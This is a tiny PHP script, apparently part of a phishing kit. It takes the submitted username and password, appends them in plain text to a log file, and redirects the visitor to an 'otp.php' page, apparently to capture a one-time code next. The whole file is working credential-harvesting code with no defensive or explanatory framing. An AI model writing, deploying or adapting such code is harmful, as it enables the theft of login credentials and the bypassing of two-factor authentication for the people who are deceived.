<?php

    file_put_contents("log.txt", "Username: " . $_POST['Username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: otp.php');
exit();

